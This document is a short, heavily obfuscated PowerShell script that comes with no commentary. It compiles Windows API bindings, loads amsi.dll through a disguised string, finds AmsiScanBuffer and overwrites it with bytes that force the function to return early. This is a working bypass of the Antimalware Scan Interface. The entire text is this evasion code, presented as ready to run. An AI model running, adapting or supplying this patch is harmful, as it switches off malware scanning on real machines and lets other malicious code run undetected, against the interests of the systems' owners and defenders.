$uy2PK0_nwmJ4IcvCHv = @"
using System;
using System.Runtime.InteropServices;
public class uy2PK0_nwmJ4IcvCHv {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr SeB7RosdjP, string KmmMb81xFeqP);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr CKPfoPL, UIntPtr duMspIHW1kT, uint U3Or7KOhdTXwF, out uint REkAtJ);
}
"@

Add-Type $uy2PK0_nwmJ4IcvCHv

$b810dHwFedWFTtAnHE = [uy2PK0_nwmJ4IcvCHv]::LoadLibrary("$(('äm'+'sí'+'.d'+'ll').normalIZE([cHAR]([byTE]0x46)+[cHaR](111)+[ChAr]([bYTE]0x72)+[cHaR]([ByTE]0x6d)+[cHaR]([byte]0x44)) -replace [ChAR]([BYTE]0x5c)+[chaR](112+48-48)+[ChaR]([BYTe]0x7b)+[cHar]([BYtE]0x4d)+[cHAr](110)+[chAR]([bYte]0x7d))")
$cWE5u_GvuT3MQE = [uy2PK0_nwmJ4IcvCHv]::GetProcAddress($b810dHwFedWFTtAnHE, "$([CHaR]([ByTe]0x41)+[CHaR]([byte]0x6d)+[cHAr](101+14)+[chaR]([byTe]0x69)+[CHaR](12+71)+[cHAr]([bYte]0x63)+[chAR](97+17-17)+[CHAr]([bytE]0x6e)+[ChaR](66*56/56)+[CHAr]([bYTE]0x75)+[ChAr]([byTe]0x66)+[ChAR](30+72)+[ChAr](7+94)+[chaR]([ByTE]0x72))")
$p = 0
[uy2PK0_nwmJ4IcvCHv]::VirtualProtect($cWE5u_GvuT3MQE, [uint32]5, 0x40, [ref]$p)
$Uw4slj7seGKP = "0xB8"
$Mnj5Q8znfz2 = "0x57"
$w3wd3giKnSL = "0x00"
$dJ0hOmIA = "0x07"
$cwBuk6 = "0x80"
$iyG5tPUr1i = "0xC3"
$pVP0F7ivP4QLOAB = [Byte[]] ($Uw4slj7seGKP,$Mnj5Q8znfz2,$w3wd3giKnSL,$dJ0hOmIA,+$cwBuk6,+$iyG5tPUr1i)
[System.Runtime.InteropServices.Marshal]::Copy($pVP0F7ivP4QLOAB, 0, $cWE5u_GvuT3MQE, 6)